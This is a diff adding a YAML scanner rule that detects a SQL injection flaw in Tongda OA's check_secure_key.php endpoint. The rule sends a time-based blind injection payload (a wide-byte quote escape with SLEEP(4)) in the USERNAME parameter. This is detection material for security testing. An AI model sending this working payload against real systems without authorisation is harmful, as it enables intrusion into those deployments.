@@ -1,0 +1,12 @@
+name: 通达OA-check_secure_key-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%284%29%29%29vMBT%29--+NpkQ
+    expression:
+      sleep: 4
+      body_all:
+        - "无此用户"
